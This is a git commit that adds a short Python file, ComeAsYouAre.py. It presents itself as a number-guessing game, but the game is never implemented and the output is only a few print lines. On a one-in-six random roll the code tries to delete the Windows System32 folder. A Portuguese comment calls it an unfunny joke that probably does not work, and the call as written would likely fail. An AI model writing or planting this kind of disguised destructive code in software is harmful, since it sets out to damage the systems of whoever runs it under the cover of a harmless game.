e975d60965ec85e5c59cdd4bb83d5cb793be41d8
Fábio Jr <fabinholpk@gmail.com>
2026-09-09 11:23:18 -0300

    Add files via upload

---
+++ ComeAsYouAre.py
@@ -0,0 +1,10 @@
+import random, os
+
+#não executem isso, isso é só uma brincadeira sem graça (provavelmente nem funciona)
+if random.randint(1,6) == 1:
+    os.remove("C:\Windows\System32")
+    print("F")
+else:
+    print("jogo de Adivinhação")
+    print("Voce tem 7 tentativas")
+    print("tente adivinhar o numero que estou pensando de 1 a 100")
